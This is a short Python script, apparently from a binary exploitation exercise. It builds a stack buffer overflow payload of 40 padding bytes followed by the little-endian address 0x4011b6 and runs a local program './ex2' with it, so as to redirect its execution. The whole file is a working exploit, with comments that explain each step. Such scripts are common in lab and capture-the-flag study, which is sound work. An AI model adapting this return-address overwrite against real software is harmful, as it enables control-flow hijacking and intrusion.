#!/usr/bin/python3
# wrapper
import os

# Create a buffer filled with 'x' characters
buff = 40 * (b'x')

# Convert the hexadecimal address to a byte array and reverse it
addr = bytearray.fromhex("4011b6")
addr.reverse()

# Append the reversed address to the buffer
buff += addr

# Print the command being executed for reference
print("exec ./ex2 with buff")

# Execute the external program './ex2' with the modified buffer as an argument
os.execv('./ex2', ['./ex2', buff])
